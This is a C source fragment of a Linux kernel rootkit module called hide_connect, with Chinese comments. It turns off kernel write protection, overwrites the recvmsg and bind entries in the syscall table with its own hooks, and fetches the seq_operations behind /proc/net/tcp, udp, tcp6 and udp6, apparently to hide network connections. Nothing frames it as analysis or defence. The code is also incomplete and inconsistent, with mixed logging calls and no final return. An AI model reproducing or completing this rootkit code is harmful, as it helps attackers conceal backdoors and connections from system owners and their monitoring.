
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/inet_diag.h> /* Needed for ntohs */
#include <net/tcp.h>         // struct tcp_seq_afinfo.
#include <net/udp.h>         // struct tcp_seq_afinfo.

#include "hide_connect.h"

struct seq_operations *tcp_operations, *udp_operations, *tcp6_operations, *udp6_operations;
static seq_show_fun tcp_seq_fun,udp_seq_fun,tcp6_seq_fun,udp6_seq_fun;

int hide_connect_init(void **real_sys_call_table){
    // 获取真实的recvmsg和bind函数地址
    real_sys_recvmsg = real_sys_call_table[__NR_recvmsg];
    real_sys_bind = real_sys_call_table[__NR_bind];

    // 关闭写保护
    disable_wp();
    real_sys_call_table[__NR_recvmsg] = my_sys_recvmsg;
    real_sys_call_table[__NR_bind] = my_sys_bind;
    // 开启写保护
    enable_wp();
    if (!(tcp_operations = get_seq_operations_ptr("/proc/net/tcp"))){
        pr_info("get tcp_op fail.");
        return 0;
    }
    if (!(udp_operations = get_seq_operations_ptr("/proc/net/udp"))){
        pr_info("get udp_op fail.");
        return 0;
    }
    if (!(tcp6_operations = get_seq_operations_ptr("/proc/net/tcp6"))){
        fm_info("get tcp6_op fail.");
        return 0;
    }
    if (!(udp6_operations = get_seq_operations_ptr("/proc/net/udp6"))){
        fm_info("get udp6_op fail.");
        return 0;
    }

}